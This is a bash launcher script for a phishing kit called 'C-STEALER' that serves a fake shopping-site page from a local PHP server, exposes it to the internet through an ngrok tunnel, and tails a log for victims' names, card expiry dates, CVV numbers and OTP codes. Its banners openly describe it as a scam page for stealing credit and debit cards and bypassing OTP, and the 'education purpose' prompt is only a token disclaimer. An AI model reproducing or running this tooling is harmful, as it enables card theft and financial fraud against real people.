#! /usr/bin/env bash
RED="31"
GREEN="32"
BOLDGREEN="\e[1;${GREEN}m"
ITALICRED="\e[3;${RED}m"
ENDCOLOR="\e[0m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
MAGENTA="\e[35m"
RED="\e[41m"
WHITE="\e[97m"
BLACK="\e[30m"
BOLDCYAN="\e[36m"
 echo -e $'\e[1;33m\e[0m' 
printf "\e[1;31m𝕃 𝕆 𝔸 𝔻 𝕀 ℕ 𝔾 ...\e[1;32m 👒 XPLOIT POISON will Exploit Target's Brain. STARTING 👒 ... \e[0m"
echo""
echo""
echo""
echo""
read -p $'\e[1;32m\e[0m\e[1;32m USE ONLY FOR EDUCATION PURPOSE  \e[1;33m     (Y/N) : \e[0m' option
echo""
if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

echo -e "${ITALICRED}created by xploitpoison.xom${ENDCOLOR}"
echo""
echo""
echo""
echo""
echo -e "${BOLDGREEN}                        ஜ۩۞۩ஜ C-STEALERஜ۩۞۩ஜ           ${ENDCOLOR}"
echo""
echo""
php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;41m        Create Credit Stealer Page and Bypass OTP         \e[0m'
echo""
echo -e $'\e[1;34m .............................................\e[0m'
echo -e $'\e[1;32m ↕   - ◀ Start STEALER   ▶      ↕\e[1;32m'
echo -e $'\e[1;34m .............................................\e[0m'
echo""
echo""
echo""
echo""
     read -p $'\e[1;41m          TYPE \e[1;97m "start" \e[1;97m To Run Page 4 Target:   \e[0m\e[1;32m : \e[1;32m'     option
		 case $option in
                        start) cd meesho/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[\e[0m\e[1;37m-\e[0m\e[1;34m]\e[0m\e[1;31m Creating Advanced Scam Page For ➡\e[1;32m   CREDIT/DEBIT CARD STEALER \e[0m'
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;32m  🛡 ➡➡➡➡➡➡➡➡➡ \e[1;31m❤\e[1;32m  STARTING PHP SERVER \e[1;31m❤\e[1;32m ⬅⬅⬅⬅⬅⬅⬅⬅⬅⬅ 🛡\e[0m'
                           
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo""
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;32m          ◀  Please Wait Few Seconds  ▶   \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            echo""
                            echo""
                            echo -e $'\e[1;32m  ◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀    ▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶  \e[0m'
                            echo -e $'\e[1;32m     Localhost Address  -:      127.0.0.1:4444  ✔   \e[0m'
                            echo -e $'\e[1;32m  ◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀    ▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶  \e[0m'
                            echo""
                            echo""
                            echo ""
                            echo ""
                            echo -e $'\e[1;32m◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀  Hacked Accounts Details   ▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶  \e[0m'
                            echo -e $'\e[1;41m◀◀◀◀◀Use Ngrok To Hack out of Network ▶▶▶▶▶▶▶\e[0m'
                            echo -e $'\e[1;32m◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀◀  Hacked Accounts Details   ▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶▶  \e[0m'
                            tail -f log.txt | grep -e "full-name" -e "" -e "exmonth" -e "exyear" -e "cvv" -e "otp-code"
                 ;;
            
                  esac
                ;;
